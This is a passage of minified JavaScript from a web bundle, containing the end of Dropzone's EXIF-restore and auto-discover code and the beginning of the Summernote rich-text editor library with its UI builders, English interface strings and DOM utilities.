this.decode64(n), o = i.indexOf(255, 3), a = i.slice(0, o), s = i.slice(o), r = a; return r = (r = r.concat(e)).concat(s) } }, { key: "slice2Segments", value: function (t) { for (var e, n, i = 0, o = []; ;) { if (255 === t[i] & 218 === t[i + 1]) break; if (255 === t[i] & 216 === t[i + 1] ? i += 2 : (e = i + (256 * t[i + 2] + t[i + 3]) + 2, n = t.slice(i, e), o.push(n), i = e), i > t.length) break } return o } }, { key: "decode64", value: function (t) { var e = void 0, n = void 0, i = "", o = void 0, a = void 0, s = "", r = 0, g = []; for (/[^A-Za-z0-9\+\/\=]/g.exec(t) && console.warn("There were invalid base64 characters in the input text.\nValid base64 characters are A-Z, a-z, 0-9, '+', '/',and '='\nExpect errors in decoding."), t = t.replace(/[^A-Za-z0-9\+\/\=]/g, ""); e = this.KEY_STR.indexOf(t.charAt(r++)) << 2 | (o = this.KEY_STR.indexOf(t.charAt(r++))) >> 4, n = (15 & o) << 4 | (a = this.KEY_STR.indexOf(t.charAt(r++))) >> 2, i = (3 & a) << 6 | (s = this.KEY_STR.indexOf(t.charAt(r++))), g.push(e), 64 !== a && g.push(n), 64 !== s && g.push(i), o = a = s = e = n = i = "", r < t.length;); return g } }]), t }(); ExifRestore.initClass(); var contentLoaded = function (e, n) { function i(t) { if ("readystatechange" !== t.type || "complete" === a.readyState) return ("load" === t.type ? e : a)[g](l + t.type, i, !1), !o && (o = !0) ? n.call(e, t.type || t) : void 0 } var o = !1, t = !0, a = e.document, s = a.documentElement, r = a.addEventListener ? "addEventListener" : "attachEvent", g = a.addEventListener ? "removeEventListener" : "detachEvent", l = a.addEventListener ? "" : "on"; if ("complete" !== a.readyState) { if (a.createEventObject && s.doScroll) { try { t = !e.frameElement } catch (t) { } t && !function e() { try { s.doScroll("left") } catch (t) { return void setTimeout(e, 50) } return i("poll") }() } return a[r](l + "DOMContentLoaded", i, !1), a[r](l + "readystatechange", i, !1), e[r](l + "load", i, !1) } }; function __guard__(t, e) { return null != t ? e(t) : void 0 } function __guardMethod__(t, e, n) { return null != t && "function" == typeof t[e] ? n(t, e) : void 0 } Dropzone._autoDiscoverFunction = function () { if (Dropzone.autoDiscover) return Dropzone.discover() }, contentLoaded(window, Dropzone._autoDiscoverFunction), function (t, e) { "object" == typeof exports && "undefined" != typeof module ? e(require("jquery")) : "function" == typeof define && define.amd ? define(["jquery"], e) : e((t = t || self).jQuery) }(this, function (B) { "use strict"; B = B && B.hasOwnProperty("default") ? B.default : B; var o = (t.prototype.render = function (t) { var e, n = B(this.markup); return this.options && this.options.contents && n.html(this.options.contents), this.options && this.options.className && n.addClass(this.options.className), this.options && this.options.data && B.each(this.options.data, function (t, e) { n.attr("data-" + t, e) }), this.options && this.options.click && n.on("click", this.options.click), this.children && (e = n.find(".note-children-container"), this.children.forEach(function (t) { t.render(e.length ? e : n) })), this.callback && this.callback(n, this.options), this.options && this.options.callback && this.options.callback(n), t && t.append(n), n }, t); function t(t, e, n, i) { this.markup = t, this.children = e, this.options = n, this.callback = i } var n = function (n, i) { return function () { var t = "object" == typeof arguments[1] ? arguments[1] : arguments[0], e = Array.isArray(arguments[0]) ? arguments[0] : []; return t && t.children && (e = t.children), new o(n, e, t, i) } }, e = n('<div class="note-editor note-frame panel panel-default"/>'), i = n('<div class="note-toolbar panel-heading" role="toolbar"></div></div>'), a = n('<div class="note-editing-area"/>'), s = n('<textarea class="note-codable" role="textbox" aria-multiline="true"/>'), r = n('<div class="note-editable" contentEditable="true" role="textbox" aria-multiline="true"/>'), g = n(['<output class="note-status-output" aria-live="polite"/>', '<div class="note-statusbar" role="status">', '  <div class="note-resizebar" role="seperator" aria-orientation="horizontal" aria-label="Resize">', '    <div class="note-icon-bar"/>', '    <div class="note-icon-bar"/>', '    <div class="note-icon-bar"/>', "  </div>", "</div>"].join("")), l = n('<div class="note-editor"/>'), c = n(['<div class="note-editable" contentEditable="true" role="textbox" aria-multiline="true"/>', '<output class="note-status-output" aria-live="polite"/>'].join("")), I = n('<div class="note-btn-group btn-group">'), u = n('<ul class="dropdown-menu" role="list">', function (t, o) { var e = Array.isArray(o.items) ? o.items.map(function (t) { var e = "string" == typeof t ? t : t.value || "", n = o.template ? o.template(t) : t, i = "object" == typeof t ? t.option : void 0; return '<li role="listitem" aria-label="' + e + '"><a href="#" ' + ('data-value="' + e + '"') + (void 0 !== i ? ' data-option="' + i + '"' : "") + ">" + n + "</a></li>" }).join("") : o.items; t.html(e).attr({ "aria-label": o.title }) }), h = n('<ul class="dropdown-menu note-check" role="list">', function (t, i) { var e = Array.isArray(i.items) ? i.items.map(function (t) { var e = "string" == typeof t ? t : t.value || "", n = i.template ? i.template(t) : t; return '<li role="listitem" aria-label="' + t + '"><a href="#" data-value="' + e + '">' + m(i.checkClassName) + " " + n + "</a></li>" }).join("") : i.items; t.html(e).attr({ "aria-label": i.title }) }), d = n('<div class="note-color-palette"/>', function (t, e) { for (var n = [], i = 0, o = e.colors.length; i < o; i++) { for (var a = e.eventName, s = e.colors[i], r = e.colorsName[i], g = [], l = 0, c = s.length; l < c; l++) { var I = s[l], u = r[l]; g.push(['<button type="button" class="note-color-btn"', 'style="background-color:', I, '" ', 'data-event="', a, '" ', 'data-value="', I, '" ', 'title="', u, '" ', 'aria-label="', u, '" ', 'data-toggle="button" tabindex="-1"></button>'].join("")) } n.push('<div class="note-color-row">' + g.join("") + "</div>") } t.html(n.join("")), e.tooltip && t.find(".note-color-btn").tooltip({ container: e.container, trigger: "hover", placement: "bottom" }) }), C = n('<div class="modal" aria-hidden="false" tabindex="-1" role="dialog"/>', function (t, e) { e.fade && t.addClass("fade"), t.attr({ "aria-label": e.title }), t.html(['<div class="modal-dialog">', '  <div class="modal-content">', e.title ? '    <div class="modal-header">      <button type="button" class="close" data-dismiss="modal" aria-label="Close" aria-hidden="true">&times;</button>      <h4 class="modal-title">' + e.title + "</h4>    </div>" : "", '    <div class="modal-body">' + e.body + "</div>", e.footer ? '    <div class="modal-footer">' + e.footer + "</div>" : "", "  </div>", "</div>"].join("")) }), A = n(['<div class="note-popover popover in">', '  <div class="arrow"/>', '  <div class="popover-content note-children-container"/>', "</div>"].join(""), function (t, e) { var n = void 0 !== e.direction ? e.direction : "bottom"; t.addClass(n), e.hideArrow && t.find(".arrow").hide() }), p = n('<div class="checkbox"></div>', function (t, e) { t.html(["<label" + (e.id ? ' for="' + e.id + '"' : "") + ">", ' <input role="checkbox" type="checkbox"' + (e.id ? ' id="' + e.id + '"' : ""), e.checked ? " checked" : "", ' aria-checked="' + (e.checked ? "true" : "false") + '"/>', e.text ? e.text : "", "</label>"].join("")) }), m = function (t, e) { return "<" + (e = e || "i") + ' class="' + t + '"/>' }, f = { editor: e, toolbar: i, editingArea: a, codable: s, editable: r, statusbar: g, airEditor: l, airEditable: c, buttonGroup: I, dropdown: u, dropdownButtonContents: function (t, e) { return t + " " + m(e.icons.caret, "span") }, dropdownCheck: h, palette: d, dialog: C, popover: A, checkbox: p, icon: m, options: {}, button: function (t, e) { return n('<button type="button" class="note-btn btn btn-default btn-sm" role="button" tabindex="-1">', function (t, e) { e && e.tooltip && t.attr({ title: e.tooltip, "aria-label": e.tooltip }).tooltip({ container: void 0 !== e.container ? e.container : "body", trigger: "hover", placement: "bottom" }).on("click", function (t) { B(t.currentTarget).tooltip("hide") }) })(t, e) }, toggleBtn: function (t, e) { t.toggleClass("disabled", !e), t.attr("disabled", !e) }, toggleBtnActive: function (t, e) { t.toggleClass("active", e) }, onDialogShown: function (t, e) { t.one("shown.bs.modal", e) }, onDialogHidden: function (t, e) { t.one("hidden.bs.modal", e) }, showDialog: function (t) { t.modal("show") }, hideDialog: function (t) { t.modal("hide") }, createLayout: function (t, e) { var n = (e.airMode ? f.airEditor([f.editingArea([f.airEditable()])]) : f.editor([f.toolbar(), f.editingArea([f.codable(), f.editable()]), f.statusbar()])).render(); return n.insertAfter(t), { note: t, editor: n, toolbar: n.find(".note-toolbar"), editingArea: n.find(".note-editing-area"), editable: n.find(".note-editable"), codable: n.find(".note-codable"), statusbar: n.find(".note-statusbar") } }, removeLayout: function (t, e) { t.html(e.editable.html()), e.editor.remove(), t.show() } }; B.summernote = B.summernote || { lang: {} }, B.extend(B.summernote.lang, { "en-US": { font: { bold: "Bold", italic: "Italic", underline: "Underline", clear: "Remove Font Style", height: "Line Height", name: "Font Family", strikethrough: "Strikethrough", subscript: "Subscript", superscript: "Superscript", size: "Font Size" }, image: { image: "Picture", insert: "Insert Image", resizeFull: "Resize full", resizeHalf: "Resize half", resizeQuarter: "Resize quarter", resizeNone: "Original size", floatLeft: "Float Left", floatRight: "Float Right", floatNone: "Remove float", shapeRounded: "Shape: Rounded", shapeCircle: "Shape: Circle", shapeThumbnail: "Shape: Thumbnail", shapeNone: "Shape: None", dragImageHere: "Drag image or text here", dropImage: "Drop image or Text", selectFromFiles: "Select from files", maximumFileSize: "Maximum file size", maximumFileSizeError: "Maximum file size exceeded.", url: "Image URL", remove: "Remove Image", original: "Original" }, video: { video: "Video", videoLink: "Video Link", insert: "Insert Video", url: "Video URL", providers: "(YouTube, Vimeo, Vine, Instagram, DailyMotion or Youku)" }, link: { link: "Link", insert: "Insert Link", unlink: "Unlink", edit: "Edit", textToDisplay: "Text to display", url: "To what URL should this link go?", openInNewWindow: "Open in new window" }, table: { table: "Table", addRowAbove: "Add row above", addRowBelow: "Add row below", addColLeft: "Add column left", addColRight: "Add column right", delRow: "Delete row", delCol: "Delete column", delTable: "Delete table" }, hr: { insert: "Insert Horizontal Rule" }, style: { style: "Style", p: "Normal", blockquote: "Quote", pre: "Code", h1: "Header 1", h2: "Header 2", h3: "Header 3", h4: "Header 4", h5: "Header 5", h6: "Header 6" }, lists: { unordered: "Unordered list", ordered: "Ordered list" }, options: { help: "Help", fullscreen: "Full Screen", codeview: "Code View" }, paragraph: { paragraph: "Paragraph", outdent: "Outdent", indent: "Indent", left: "Align left", center: "Align center", right: "Align right", justify: "Justify full" }, color: { recent: "Recent Color", more: "More Color", background: "Background Color", foreground: "Foreground Color", transparent: "Transparent", setTransparent: "Set transparent", reset: "Reset", resetToDefault: "Reset to default", cpSelect: "Select" }, shortcut: { shortcuts: "Keyboard shortcuts", close: "Close", textFormatting: "Text formatting", action: "Action", paragraphFormatting: "Paragraph formatting", documentStyle: "Document Style", extraKeys: "Extra keys" }, help: { insertParagraph: "Insert Paragraph", undo: "Undoes the last command", redo: "Redoes the last command", tab: "Tab", untab: "Untab", bold: "Set a bold style", italic: "Set a italic style", underline: "Set a underline style", strikethrough: "Set a strikethrough style", removeFormat: "Clean a style", justifyLeft: "Set left align", justifyCenter: "Set center align", justifyRight: "Set right align", justifyFull: "Set full align", insertUnorderedList: "Toggle unordered list", insertOrderedList: "Toggle ordered list", outdent: "Outdent on current paragraph", indent: "Indent on current paragraph", formatPara: "Change current block's format as a paragraph(P tag)", formatH1: "Change current block's format as H1", formatH2: "Change current block's format as H2", formatH3: "Change current block's format as H3", formatH4: "Change current block's format as H4", formatH5: "Change current block's format as H5", formatH6: "Change current block's format as H6", insertHorizontalRule: "Insert horizontal rule", "linkDialog.show": "Show Link Dialog" }, history: { undo: "Undo", redo: "Redo" }, specialChar: { specialChar: "SPECIAL CHARACTERS", select: "Select Special characters" } } }); var b = "function" == typeof define && define.amd; var y, v, x = navigator.userAgent, F = /MSIE|Trident/i.test(x); F && ((v = /MSIE (\d+[.]\d+)/.exec(x)) && (y = parseFloat(v[1])), (v = /Trident\/.*rv:([0-9]{1,}[.0-9]{0,})/.exec(x)) && (y = parseFloat(v[1]))); var Q = /Edge\/\d+/.test(x), G = !!window.CodeMirror, w = "ontouchstart" in window || 0 < navigator.MaxTouchPoints || 0 < navigator.msMaxTouchPoints, X = F || Q ? "DOMCharacterDataModified DOMSubtreeModified DOMNodeInserted" : "input", S = { isMac: -1 < navigator.appVersion.indexOf("Mac"), isMSIE: F, isEdge: Q, isFF: !Q && /firefox/i.test(x), isPhantom: /PhantomJS/i.test(x), isWebkit: !Q && /webkit/i.test(x), isChrome: !Q && /chrome/i.test(x), isSafari: !Q && /safari/i.test(x), browserVersion: y, jqueryVersion: parseFloat(B.fn.jquery), isSupportAmd: b, isSupportTouch: w, hasCodeMirror: G, isFontInstalled: function (t) { var e = "Comic Sans MS" === t ? "Courier New" : "Comic Sans MS", n = "mmmmmmmmmmwwwww", i = document.createElement("canvas").getContext("2d"); i.font = "200px '" + e + "'"; var o = i.measureText(n).width; return i.font = "200px '" + t + "', '" + e + "'", o !== i.measureText(n).width }, isW3CRangeSupport: !!document.createRange, inputEventName: X }; var k = 0; var D = { eq: function (e) { return function (t) { return e === t } }, eq2: function (t, e) { return t === e }, peq2: function (n) { return function (t, e) { return t[n] === e[n] } }, ok: function () { return !0 }, fail: function () { return !1 }, self: function (t) { return t }, not: function (t) { return function () { return !t.apply(t, arguments) } }, and: function (e, n) { return function (t) { return e(t) && n(t) } }, invoke: function (t, e) { return function () { return t[e].apply(t, arguments) } }, uniqueId: function (t) { var e = ++k + ""; return t ? t + e : e }, rect2bnd: function (t) { var e = $(document); return { top: t.top + e.scrollTop(), left: t.left + e.scrollLeft(), width: t.right - t.left, height: t.bottom - t.top } }, invertObject: function (t) { var e = {}; for (var n in t) t.hasOwnProperty(n) && (e[t[n]] = n); return e }, namespaceToCamel: function (t, e) { return (e = e || "") + t.split(".").map(function (t) { return t.substring(0, 1).toUpperCase() + t.substring(1) }).join("") }, debounce: function (i, o, a) { var s; return function () { var t = this, e = arguments, n = a && !s; clearTimeout(s), s = setTimeout(function () { s = null, a || i.apply(t, e) }, o), n && i.apply(t, e) } }, isValidUrl: function (t) { return /[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/gi.test(t) } }; function Z(t) { return t[0] } function U(t) { return t[t.length - 1] } function W(t) { return t.slice(1) } function N(t, e) { return !!(t && t.length && e) && -1 !== t.indexOf(e) } var T = { head: Z, last: U, initial: function (t) { return t.slice(0, t.length - 1) }, tail: W, prev: function (t, e) { if (t && t.length && e) { var n = t.indexOf(e); return -1 === n ? null : t[n - 1] } return null }, next: function (t, e) { if (t && t.length && e) { var n = t.indexOf(e); return -1 === n ? null : t[n + 1] } return null }, find: function (t, e) { for (var n = 0, i = t.length; n < i; n++) { var o = t[n]; if (e(o)) return o } }, contains: N, all: function (t, e) { for (var n = 0, i = t.length; n < i; n++)if (!e(t[n])) return !1; return !0 }, sum: function (t, n) { return n = n || D.self, t.reduce(function (t, e) { return t + n(e) }, 0) }, from: function (t) { for (var e = [], n = t.length, i = -1; ++i < n;)e[i] = t[i]; return e }, isEmpty: function (t) { return !t || !t.length }, clusterBy: function (t, i) { return t.length ? W(t).reduce(function (t, e) { var n = U(t); return i(U(n), e) ? n[n.length] = e : t[t.length] = [e], t }, [[Z(t)]]) : [] }, compact: function (t) { for (var e = [], n = 0, i = t.length; n < i; n++)t[n] && e.push(t[n]); return e }, unique: function (t) { for (var e = [], n = 0, i = t.length; n < i; n++)N(e, t[n]) || e.push(t[n]); return e } }, H = String.fromCharCode(160); function E(t) { return t && B(t).hasClass("note-editable") } function R(e) { return e = e.toUpperCase(), function (t) { return t && t.nodeName.toUpperCase() === e } } function Y(t) { return t && 3 === t.nodeType } function O(t) { return t && /^BR|^IMG|^HR|^IFRAME|^BUTTON|^INPUT|^AUDIO|^VIDEO|^EMBED/.test(t.nodeName.toUpperCase()) } function _(t) { return !E(t) && (t && /^DIV|^P|^LI|^H[1-7]/.test(t.nodeName.toUpperCase())) } var V = R("PRE"), L = R("LI"); var M = R("TABLE"), z = R("DATA"); function P(t) { return !(tt(t) || K(t) || J(t) || _(t) || M(t) || q(t) || z(t)) } function K(t) { return t && /^UL|^OL/.test(t.nodeName.toUpperCase()) } var J = R("HR"); function j(t) { return t && /^TD|^TH/.test(t.nodeName.toUpperCase()) } var q = R("BLOCKQUOTE"); function tt(t) { return j(t) || q(t) || E(t) } var et = R("A"); var nt = R("BODY"); var it = S.isMSIE && S.browserVersion < 11 ? "&nbsp;" : "<br>"; function ot(t) { return Y(t) ? t.nodeValue.length : t ? t.childNodes.length : 0 } function at(t) { var e = ot(t); return 0 === e || (!Y(t) && 1 === e && t.innerHTML === it || !(!T.all(t.childNodes, Y) || "" !== t.innerHTML)) } function st(t) { O(t) || ot(t) || (t.innerHTML = it) } function rt(t, e) { for (; t;) { if (e(t)) return t; if (E(t)) break; t = t.parentNode } return null } function gt(t, e) { e = e || D.fail; var n = []; return rt(t, function (t) { return E(t) || n.push(t), e(t) }), n } function lt(t, e) { e = e || D.fail; for (var n = []; t && !e(t);)n.push(t), t = t.nextSibling; return n } function ct(t, e) { var n = e.nextSibling, i = e.parentNode; return n ? i.insertBefore(t, n) : i.appendChild(t), t } function It(n, t) { return B.each(t, function (t, e) { n.appendChild(e) }), n } function ut(t) { return 0 === t.offset } function ht(t) { return t.offset === ot(t.node) } function dt(t) { return ut(t) || ht(t) } function Ct(t, e) { for (; t && t !== e;) { if (0 !== pt(t)) return !1; t = t.parentNode } return !0 } function At(t, e) { if (!e) return !1; for (; t && t !== e;) { if (pt(t) !== ot(t.parentNode) - 1) return !1; t = t.parentNode } return !0 } function pt(t) { for (var e = 0; t = t.previousSibling;)e += 1; return e } function mt(t) { return !!(t && t.childNodes && t.childNodes.length) } function ft(t, e) { var n, i; if (0 === t.offset) { if (E(t.node)) return null; n = t.node.parentNode, i = pt(t.node) } else i = mt(t.node) ? ot(n = t.node.childNodes[t.offset - 1]) : (n = t.node, e ? 0 : t.offset - 1); return { node: n, offset: i } } function bt(t, e) { var n, i; if (ot(t.node) === t.offset) { if (E(t.node)) return null; n = t.node.parentNode, i = pt(t.node) + 1 } else i = mt(t.node) ? (n = t.node.childNodes[t.offset], 0) : (n = t.node, e ? ot(t.node) : t.offset + 1); return { node: n, offset: i } } function Bt(t, e) { return t.node === e.node && t.offset === e.offset } function yt(t, e) { var n = e && e.isSkipPaddingBlankHTML, i = e && e.isNotSplitEdgePoint, o = e && e.isDiscardEmptySplits; if (o && (n = !0), dt(t) && (Y(t.node) || i)) { if (ut(t)) return t.node; if (ht(t)) return t.node.nextSibling } if (Y(t.node)) return t.node.splitText(t.offset); var a = t.node.childNodes[t.offset], s = ct(t.node.cloneNode(!1), t.node); return It(s, lt(a)), n || (st(t.node), st(s)), o && (at(t.node) && Ft(t.node), at(s)) ? (Ft(s), t.node.nextSibling) : s } function vt(t, n, i) { var e = gt(n.node, D.eq(t)); return e.length ? 1 === e.length ? yt(n, i) : e.reduce(function (t, e) { return t === n.node && (t = yt(n, i)), yt({ node: e, offset: t ? pt(t) : ot(e) }, i) }) : null } function xt(t) { return document.createElement(t) } function Ft(t, e) { if (t && t.parentNode) { if (t.removeNode) return t.removeNode(e); var n = t.parentNode; if (!e) { for (var i = [], o = 0, a = t.childNodes.length; o < a; o++)i.push(t.childNodes[o]); for (o = 0, a = i.length; o < a; o++)n.insertBefore(i[o], t) } n.removeChild(t) } } var Qt = R("TEXTAREA"); function Gt(t, e) { var n = Qt(t[0]) ? t.val() : t.html(); return e ? n.replace(/[\n\r]/g, "") : n } var wt = { NBSP_CHAR: H, ZERO_WIDTH_NBSP_CHAR: "\ufeff", blank: it, emptyPara: "<p>" + it + "</p>", makePredByNodeName: R, isEditable: E, isControlSizing: function (t) { return t && B(t).hasClass("note-control-sizing") }, isText: Y, isElement: function (t) { return t && 1 === t.nodeType }, isVoid: O, isPara: _, isPurePara: function (t) { return _(t) && !L(t) }, isHeading: function (t) { return t && /^H[1-7]/.test(t.nodeName.toUpperCase()) }, isInline: P, isBlock: D.not(P), isBodyInline: function (t) { return P(t) && !rt(t, _) }, isBody: nt, isParaInline: function (t) { return P(t) && !!rt(t, _) }, isPre: V, isList: K, isTable: M, isData: z, isCell: j, isBlockquote: q, isBodyContainer: tt, isAnchor: et, isDiv: R("DIV"), isLi: L, isBR: R("BR"), isSpan: R("SPAN"), isB: R("B"), isU: R("U"), isS: R("S"), isI: R("I"), isImg: R("IMG"), isTextarea: Qt, isEmpty: at, isEmptyAnchor: D.and(et, at), isClosestSibling: function (t, e) { return t.nextSibling === e || t.previousSibling === e }, withClosestSiblings: function (t, e) { e = e || D.ok; var n = []; return t.previousSibling && e(t.previousSibling) && n.push(t.previousSibling), n.push(t), t.nextSibling && e(t.nextSibling) && n.push(t.nextSibling), n }, nodeLength: ot, isLeftEdgePoint: ut, isRightEdgePoint: ht, isEdgePoint: dt, isLeftEdgeOf: Ct, isRightEdgeOf: At, isLeftEdgePointOf: function (t, e) { return ut(t) && Ct(t.node, e) }, isRightEdgePointOf: function (t, e) { return ht(t) && At(t.node, e) }, prevPoint: ft, nextPoint: bt, isSamePoint: Bt, isVisiblePoint: function (t) { if (Y(t.node) || !mt(t.node) || at(t.node)) return !0; var e = t.node.childNodes[t.offset - 1], n = t.node.childNodes[t.offset]; return !(e && !O(e) || n && !O(n)) }, prevPointUntil: function (t, e) { for (; t;) { if (e(t)) return t; t = ft(t) } return null }, nextPointUntil: function (t, e) { for (; t;) { if (e(t)) return t; t = bt(t) } return null }, isCharPoint: function (t) { if (!Y(t.node)) return !1; var e = t.node.nodeValue.charAt(t.offset - 1); return e && " " !== e && e !== H }, walkPoint: function (t, e, n, i) { for (var o = t; o && (n(o), !Bt(o, e));)o = bt(o, i && t.node !== o.node && e.node !== o.node) }, ancestor: rt, singleChildAncestor: function (t, e) { for (t = t.parentNode; t && 1 === ot(t);) { if (e(t)) return t; if (E(t)) break; t = t.parentNode } return null }, listAncestor: gt, lastAncestor: function (t, e) { var n = gt(t); return T.last(n.filter(e)) }, listNext: lt, listPrev: function (t, e) { e = e || D.fail; for (var n = []; t && !e(t);)n.push(t), t = t.previousSibling; return n }, listDescendant: function (o, a) { var s = []; return a = a || D.ok, function t(e) { o !== e && a(e) && s.push(e); for (var n = 0, i = e.childNodes.length; n < i; n++)t(e.childNodes[n]) }(o), s }, commonAncestor: function (t, e) { for (var n = gt(t), i = e; i; i = i.parentNode)if (-1 < n.indexOf(i)) return i; return null }, wrap: function (t, e) { var n = t.parentNode, i = B("<" + e + ">")[0]; return n.insertBefore(i, t), i.appendChild(t), i }, insertAfter: ct, appendChildNodes: It, position: pt, hasChildren: mt, makeOffsetPath: function (t, e) { return gt(e, D.eq(t)).map(pt).reverse() }, fromOffsetPath: function (t, e) { for (var n = t, i = 0, o = e.length; i < o; i++)n = n.childNodes.length <= e[i] ? n.childNodes[n.childNodes.length - 1] : n.childNodes[e[i]]; return n }, splitTree: vt, splitPoint: function (t, e) { var n, i = e ? _ : tt, o = gt(t.node, i), a = T.last(o) || t.node, s = i(a) ? (n = o[o.length - 2], a) : (n = a).parentNode, r = n && vt(n, t, { isSkipPaddingBlankHTML: e, isNotSplitEdgePoint: e }); return r || s !== t.node || (r = t.node.childNodes[t.offset]), { rightNode: r, container: s } }, create: xt, createText: function (t) { return document.createTextNode(t) }, remove: Ft, removeWhile: function (t, e) { for (; t && !E(t) && e(t);) { var n = t.parentNode; Ft(t), t = n } }, replace: function (t, e) { if (t.nodeName.toUpperCase() === e.toUpperCase()) return t; var n = xt(e); return t.style.cssText && (n.style.cssText = t.style.cssText), It(n, T.from(t.childNodes)), ct(n, t), Ft(t), n }, html: function (t, e) { var n = Gt(t); return e && (n = (n = n.replace(/<(\/?)(\b(?!!)[^>\s]*)(.*?)(\s*\/?>)/g, function (t, e, n) { n = n.toUpperCase(); var i = /^DIV|^TD|^TH|^P|^LI|^H[1-7]/.test(n) && !!e, o = /^BLOCKQUOTE|^TABLE|^TBODY|^TR|^HR|^UL|^OL/.test(n); return t + (i || o ? "\n" : "") })).trim()), n }, value: Gt, posFromPlaceholder: function (t) { var e = B(t), n = e.offset(), i = e.outerHeight(!0); return { left: n.left, top: n.top + i } }, attachEvents: function (e, n) { Object.keys(n).forEach(function (t) { e.on(t, n[t]) }) }, detachEvents: function (e, n) { Object.keys(n).forEach(function (t) { e.off(t, n[t]) }) }, isCustomStyleTag: function (t) { return t && !Y(t) && T.contains(t.classList, "note-styletag") } }, Xt = (St.prototype.initialize = function () { return this.layoutInfo = this.ui.createLayout(this.$note, this.options), this._initialize(), this.$note.hide(), this }, St.prototype.destroy = function () { this._destroy(), this.$note.removeData("summernote"), this.ui.removeLayout(this.$note, this.layoutInfo) }, St.prototype.reset = function () { var t = this.isDisabled(); this.code(wt.emptyPara), this._destroy(), this._initialize(), t && this.disable() }, St.prototype._initialize = function () { var e = this, n = B.extend({}, this.options.buttons); Object.keys(n).forEach(function (t) { e.memo("button." + t, n[t]) }); var i = B.extend({}, this.options.modules, B.summernote.plugins || {}); Object.keys(i).forEach(function (t) { e.module(t, i[t], !0) }), Object.keys(this.modules).forEach(function (t) { e.initializeModule(t) }) }, St.prototype._destroy = function () { var e = this; Object.keys(this.modules).reverse().forEach(function (t) { e.removeModule(t) }), Object.keys(this.memos).forEach(function (t) { e.removeMemo(t) }), this.triggerEvent("destroy", this) }, St.prototype.code = function (t) { var e = this.invoke("codeview.isActivated"); if (void 0 === t) return this.invoke("codeview.sync"), e ? this.layoutInfo.codable.val() : this.layoutInfo.editable.html(); e ? this.layoutInfo.codable.val(t) : this.layoutInfo.editable.html(t), this.$note.val(t), this.triggerEvent("change", t, this.layoutInfo.editable) }, St.prototype.isDisabled = function () { return "false" === this.layoutInfo.editable.attr("contenteditable") }, St.prototype.enable = function () { this.layoutInfo.editable.attr("contenteditable", !0), this.invoke("toolbar.activate", !0), this.triggerEvent("disable", !1) }, St.prototype.disable = function () { this.invoke("codeview.isActivated") && this.invoke("codeview.deactivate"), this.layoutInfo.editable.attr("contenteditable", !1), this.invoke("toolbar.deactivate", !0), this.triggerEvent("disable", !0) }, St.prototype.triggerEvent = function () { var t = T.head(arguments), e = T.tail(T.from(arguments)), n = this.options.callbacks[D.namespaceToCamel(t, "on")]; n && n.apply(this.$note[0], e), this.$note.trigger("summernote." + t, e) }, St.prototype.initializeModule = function (t) { var e = this.modules[t]; e.shouldInitialize = e.shouldInitialize || D.ok, e.shouldInitialize() && (e.initialize && e.initialize(), e.events && wt.attachEvents(this.$note, e.events)) }, St.prototype.module = function (t, e, n) { if (1 === arguments.length) return this.modules[t]; this.modules[t] = new e(this), n || this.initializeModule(t) }, St.prototype.removeModule = function (t) { var e = this.modules[t]; e.shouldInitialize() && (e.events && wt.detachEvents(this.$note, e.events), e.destroy && e.destroy()), delete this.modules[t] }, St.prototype.memo = function (t, e) { if (1 === arguments.length) return this.memos[t]; this.memos[t] = e }, St.prototype.removeMemo = function (t) { this.memos[t] && this.memos[t].destroy && this.memos[t].destroy(), delete this.memos[t] }, St.prototype.createInvokeHandlerAndUpdateState = function (e, n) { var i = this; return function (t) { i.createInvokeHandler(e, n)(t), i.invoke("buttons.updateCurrentStyle") } }, St.prototype.createInvokeHandler = function (n, i) { var o = this; return function (t) { t.preventDefault(); var e = B(t.target); o.invoke(n, i || e.closest("[data-value]").data("value"), e) } }, St.prototype.invoke = function () { var t = T.head(arguments), e = T.tail(T.from(arguments)), n = t.split("."), i = 1 < n.length, o = i && T.head(n), a = i ? T.last(n) : T.head(n), s = this.modules[o || "editor"]; return !o && this[a] ? this[a].apply(this, e) : s && s[a] && s.shouldInitialize() ? s[a].apply(s, e) : void 0 }, St); function St(t, e) { this.ui = B.summernote.ui, this.$note = t, this.memos = {}, this.modules = {}, this.layoutInfo = {}, this.options = e, this.initialize() } function kt(t, e) { for (var n, i = t.parentElement(), o = document.body.createTextRange(), a = T.from(i.childNodes), s = 0; s < a.length; s++)if (!wt.isText(a[s])) { if (o.moveToElementText(a[s]), 0 <= o.compareEndPoints("StartToStart", t)) break; n = a[s] } if (0 !== s && wt.isText(a[s - 1])) { var r = document.body.createTextRange(), g = null; r.moveToElementText(n || i), r.collapse(!n), g = n ? n.nextSibling : i.firstChild; var l = t.duplicate(); l.setEndPoint("StartToStart", r); for (var c = l.text.replace(/[\r\n]/g, "").length; c > g.nodeValue.length && g.nextSibling;)c -= g.nodeValue.length, g = g.nextSibling; g.nodeValue; e && g.nextSibling && wt.isText(g.nextSibling) && c === g.nodeValue.length && (c -= g.nodeValue.length, g = g.nextSibling), i = g, s = c } return { cont: i, offset: s } } function Dt(t) { var s = function (t, e) { var n; if (wt.isText(t)) { var i = wt.listPrev(t, D.not(wt.isText)), o = T.last(i).previousSibling, a = o || t.parentNode; e += T.sum(T.tail(i), wt.nodeLength), n = !o } else { if (a = t.childNodes[e] || t, wt.isText(a)) return s(a, 0); e = 0, n = !1 } return { node: a, collapseToStart: n, offset: e } }, e = document.body.createTextRange(), n = s(t.node, t.offset); return e.moveToElementText(n.node), e.collapse(n.collapseToStart), e.moveStart("character", n.offset), e } B.fn.extend({ summernote: function () { var t = B.type(T.head(arguments)), e = "string" === t, n = "object" === t, o = B.extend({}, B.summernote.options, n ? T.head(arguments) : {}); o.langInfo = B.extend(!0, {}, B.summernote.lang["en-US"], B.summernote.lang[o.lang]), o.icons = B.extend(!0, {}, B.summernote.options.icons, o.icons), o.tooltip = "auto" === o.tooltip ? !S.isSupportTouch : o.tooltip, this.each(function (t, e) { var n, i = B(e); i.data("summernote") || (n = new Xt(i, o), i.data("summernote", n), i.data("summernote").triggerEvent("init", n.layoutInfo)) }); var i = this.first(); if (i.length) { var a = i.data("summernote"); if (e) return a.invoke.apply(a, T.from(arguments)); o.focus && a.invoke("editor.focus") } return this } }); var Zt = (Ut.prototype.nativeRange = function () { if (S.isW3CRangeSupport) { var t = document.createRange(); return t.setStart(this.sc, this.sc.data && this.so > this.sc.data.length ? 0 : this.so), t.setEnd(this.ec, this.sc.data ? Math.min(this.eo, this.sc.data.length) : this.eo), t } var e = Dt({ node: 